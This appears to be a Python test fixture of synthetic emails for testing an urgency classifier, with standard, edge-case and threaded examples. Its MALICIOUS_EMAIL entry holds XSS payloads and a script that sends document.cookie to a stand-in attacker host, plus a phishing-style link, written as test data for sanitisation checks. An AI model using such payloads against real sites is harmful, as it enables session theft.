"""
Mock email data for testing purposes.
This file contains synthetic email data covering various scenarios and edge cases.
"""
from datetime import datetime, timezone, timedelta
from typing import Dict, List, Any

# Standard sample timestamps for consistent testing
NOW = datetime.now(timezone.utc)
YESTERDAY = NOW - timedelta(days=1)
LAST_WEEK = NOW - timedelta(days=7)
ONE_HOUR_AGO = NOW - timedelta(hours=1)
TWO_HOURS_AGO = NOW - timedelta(hours=2)


# STANDARD TEST EMAILS
# These are basic examples with clear characteristics
STANDARD_EMAIL = {
    'id': 'standard_email_id',
    'thread_id': 'standard_thread_id',
    'subject': 'Regular Project Update',
    'sender': 'colleague@example.com',
    'body_plain': 'Hi team,\n\nHere is the weekly project update. We are on track with all deliverables. Let me know if you have any questions.\n\nRegards,\nColleague',
    'body_html': '<div>Hi team,<br><br>Here is the weekly project update. We are on track with all deliverables. Let me know if you have any questions.<br><br>Regards,<br>Colleague</div>',
    'received_timestamp': ONE_HOUR_AGO,
    'snippet': 'Hi team, Here is the weekly project update...'
}

URGENT_EMAIL = {
    'id': 'urgent_email_id',
    'thread_id': 'urgent_thread_id',
    'subject': 'URGENT: System Downtime Alert',
    'sender': 'alerts@example.com',
    'body_plain': 'ATTENTION: The production server is currently down. This is affecting all customer transactions. Immediate action required to restore service. Please respond ASAP!',
    'body_html': '<div><strong>ATTENTION:</strong> The production server is currently down. This is affecting all customer transactions. <span style="color:red">Immediate action required</span> to restore service. Please respond ASAP!</div>',
    'received_timestamp': NOW,
    'snippet': 'ATTENTION: The production server is currently down...'
}

ANALYZED_URGENT_EMAIL = {
    **URGENT_EMAIL,
    'is_urgent': True,
    'summary': 'Production server down affecting customer transactions. Immediate action needed to restore service.'
}

ANALYZED_STANDARD_EMAIL = {
    **STANDARD_EMAIL,
    'is_urgent': False,
    'summary': 'Weekly project update indicating the team is on track with deliverables.'
}

# EDGE CASES
# These emails test boundary conditions and special cases

# Extremely long email
LONG_EMAIL = {
    'id': 'long_email_id',
    'thread_id': 'long_thread_id',
    'subject': 'Detailed Project Specifications',
    'sender': 'product.manager@example.com',
    'body_plain': 'Dear Team,\n\n' + ('This is an extremely detailed description of project requirements. ' * 500),
    'body_html': '<div>Dear Team,<br><br>' + ('This is an extremely detailed description of project requirements. ' * 500) + '</div>',
    'received_timestamp': YESTERDAY,
    'snippet': 'Dear Team, This is an extremely detailed description...'
}

# Email with empty fields
EMPTY_FIELDS_EMAIL = {
    'id': 'empty_fields_id',
    'thread_id': 'empty_thread_id',
    'subject': '',
    'sender': 'unknown@example.com',
    'body_plain': '',
    'body_html': '',
    'received_timestamp': YESTERDAY,
    'snippet': ''
}

# Email with None values for optional fields
NULL_FIELDS_EMAIL = {
    'id': 'null_fields_id',
    'thread_id': 'null_thread_id',
    'subject': None,
    'sender': None,
    'body_plain': None,
    'body_html': None,
    'received_timestamp': YESTERDAY,
    'snippet': None
}

# Email with special characters
SPECIAL_CHARS_EMAIL = {
    'id': 'special_chars_id',
    'thread_id': 'special_thread_id',
    'subject': '¡Spécial Chãracters! テスト',
    'sender': 'test+special@example.com',
    'body_plain': 'Testing with special characters: éèêëàçñ\n你好\nこんにちは\n안녕하세요',
    'body_html': '<div>Testing with special characters: éèêëàçñ<br>你好<br>こんにちは<br>안녕하세요</div>',
    'received_timestamp': LAST_WEEK,
    'snippet': 'Testing with special characters: éèêëàçñ...'
}

# HTML-only email (no plain text)
HTML_ONLY_EMAIL = {
    'id': 'html_only_id',
    'thread_id': 'html_thread_id',
    'subject': 'HTML Newsletter',
    'sender': 'newsletter@example.com',
    'body_plain': None,
    'body_html': '<div style="color:blue">This is an HTML-only email with <strong>rich formatting</strong> and <img src="cid:image1" alt="embedded image"></div>',
    'received_timestamp': TWO_HOURS_AGO,
    'snippet': 'This is an HTML-only email with rich formatting...'
}

# Plain-text only email (no HTML)
PLAIN_ONLY_EMAIL = {
    'id': 'plain_only_id',
    'thread_id': 'plain_thread_id',
    'subject': 'Plain Text Only',
    'sender': 'plaintext@example.com',
    'body_plain': 'This is a plain-text only email.\nNo HTML formatting is included.\nRegards,\nPlain Texter',
    'body_html': None,
    'received_timestamp': TWO_HOURS_AGO,
    'snippet': 'This is a plain-text only email...'
}

# Email with HTML injection attempt
MALICIOUS_EMAIL = {
    'id': 'malicious_id',
    'thread_id': 'malicious_thread_id',
    'subject': 'Important <script>alert("XSS")</script>',
    'sender': 'suspicious@example.com',
    'body_plain': 'This email contains potential malicious content like: <script>document.location="http://malicious.example.com/steal.php?cookie="+document.cookie</script>',
    'body_html': '<div>This email has hidden code <script>alert("XSS")</script> and a <a href="http://malicious.example.com/phish">legitimate link</a></div>',
    'received_timestamp': YESTERDAY,
    'snippet': 'This email contains potential malicious content...'
}

# Email with emoji and unicode
EMOJI_EMAIL = {
    'id': 'emoji_id',
    'thread_id': 'emoji_thread_id',
    'subject': '🎉 Celebration Time! 🥳',
    'sender': 'party@example.com',
    'body_plain': 'Let\'s celebrate! 🎈🎊🎁\nWe reached our goals! 🚀\nSee you at the party! 🍕🍻',
    'body_html': '<div>Let\'s celebrate! 🎈🎊🎁<br>We reached our goals! 🚀<br>See you at the party! 🍕🍻</div>',
    'received_timestamp': NOW,
    'snippet': 'Let\'s celebrate! 🎈🎊🎁 We reached our goals!...'
}

# Borderline urgent email - ambiguous whether it's urgent
BORDERLINE_URGENT_EMAIL = {
    'id': 'borderline_id',
    'thread_id': 'borderline_thread_id',
    'subject': 'Please Review Soon - Approaching Deadline',
    'sender': 'project.manager@example.com',
    'body_plain': 'We need your feedback on the proposal relatively soon. The client would appreciate a response by end of week if possible. It would be helpful to prioritize this.',
    'body_html': '<div>We need your feedback on the proposal relatively soon. The client would appreciate a response by end of week if possible. It would be helpful to prioritize this.</div>',
    'received_timestamp': YESTERDAY,
    'snippet': 'We need your feedback on the proposal relatively soon...'
}

# Urgent email with no explicit urgent keywords (contextually urgent)
IMPLICIT_URGENT_EMAIL = {
    'id': 'implicit_urgent_id',
    'thread_id': 'implicit_urgent_thread_id',
    'subject': 'System Error Rate Exceeding Threshold',
    'sender': 'monitoring@example.com',
    'body_plain': 'The application is experiencing a 25% error rate, up from the normal 0.1%. Customer complaints are increasing. The engineering team should investigate as soon as possible.',
    'body_html': '<div>The application is experiencing a 25% error rate, up from the normal 0.1%. Customer complaints are increasing. The engineering team should investigate as soon as possible.</div>',
    'received_timestamp': NOW,
    'snippet': 'The application is experiencing a 25% error rate...'
}

# Email with misleading urgency words in non-urgent context
MISLEADING_URGENCY_EMAIL = {
    'id': 'misleading_id',
    'thread_id': 'misleading_thread_id',
    'subject': 'Article on "Urgent Care Facilities"',
    'sender': 'newsletter@example.com',
    'body_plain': 'We\'ve published a new article about urgent care facilities and their importance in healthcare. As referenced in "Emergency and Urgent Care Weekly," these facilities play a critical role.',
    'body_html': '<div>We\'ve published a new article about urgent care facilities and their importance in healthcare. As referenced in "Emergency and Urgent Care Weekly," these facilities play a critical role.</div>',
    'received_timestamp': YESTERDAY,
    'snippet': 'We\'ve published a new article about urgent care facilities...'
}

# Multiple emails grouped by conversation thread
THREAD_EMAILS = [
    {
        'id': 'thread_email_1',
        'thread_id': 'shared_thread_id',
        'subject': 'Question about project timeline',
        'sender': 'team.member@example.com',
        'body_plain': 'Hi, I was wondering when the project timeline will be finalized?',
        'body_html': '<div>Hi, I was wondering when the project timeline will be finalized?</div>',
        'received_timestamp': YESTERDAY,
        'snippet': 'Hi, I was wondering when the project timeline...'
    },
    {
        'id': 'thread_email_2',
        'thread_id': 'shared_thread_id',
        'subject': 'Re: Question about project timeline',
        'sender': 'manager@example.com',
        'body_plain': 'We should have it ready by next Tuesday. I\'ll share it with the team then.',
        'body_html': '<div>We should have it ready by next Tuesday. I\'ll share it with the team then.</div>',
        'received_timestamp': ONE_HOUR_AGO,
        'snippet': 'We should have it ready by next Tuesday...'
    },
    {
        'id': 'thread_email_3',
        'thread_id': 'shared_thread_id',
        'subject': 'Re: Question about project timeline',
        'sender': 'team.member@example.com',
        'body_plain': 'Great, thanks for the update!',
        'body_html': '<div>Great, thanks for the update!</div>',
        'received_timestamp': NOW,
        'snippet': 'Great, thanks for the update!'
    }
]

# A collection of emails of varying urgency for batch testing
MIXED_URGENCY_EMAILS = [
    URGENT_EMAIL,
    STANDARD_EMAIL,
    BORDERLINE_URGENT_EMAIL,
    IMPLICIT_URGENT_EMAIL,
    MISLEADING_URGENCY_EMAIL
]

# Create collections of emails by categories for easy access
ALL_EMAILS = {
    # Standard cases
    'standard': STANDARD_EMAIL,
    'urgent': URGENT_EMAIL,
    # Edge cases
    'long': LONG_EMAIL,
    'empty_fields': EMPTY_FIELDS_EMAIL,
    'null_fields': NULL_FIELDS_EMAIL,
    'special_chars': SPECIAL_CHARS_EMAIL,
    'html_only': HTML_ONLY_EMAIL,
    'plain_only': PLAIN_ONLY_EMAIL,
    'malicious': MALICIOUS_EMAIL,
    'emoji': EMOJI_EMAIL,
    'borderline_urgent': BORDERLINE_URGENT_EMAIL,
    'implicit_urgent': IMPLICIT_URGENT_EMAIL,
    'misleading_urgency': MISLEADING_URGENCY_EMAIL
}

# Collection of analyzed emails
ANALYZED_EMAILS = {
    'standard': ANALYZED_STANDARD_EMAIL,
    'urgent': ANALYZED_URGENT_EMAIL,
}

# Export collections for easy import in tests
__all__ = [
    'STANDARD_EMAIL', 'URGENT_EMAIL', 
    'ANALYZED_STANDARD_EMAIL', 'ANALYZED_URGENT_EMAIL',
    'LONG_EMAIL', 'EMPTY_FIELDS_EMAIL', 'NULL_FIELDS_EMAIL',
    'SPECIAL_CHARS_EMAIL', 'HTML_ONLY_EMAIL', 'PLAIN_ONLY_EMAIL',
    'MALICIOUS_EMAIL', 'EMOJI_EMAIL', 'BORDERLINE_URGENT_EMAIL',
    'IMPLICIT_URGENT_EMAIL', 'MISLEADING_URGENCY_EMAIL',
    'THREAD_EMAILS', 'MIXED_URGENCY_EMAILS',
    'ALL_EMAILS', 'ANALYZED_EMAILS'
] 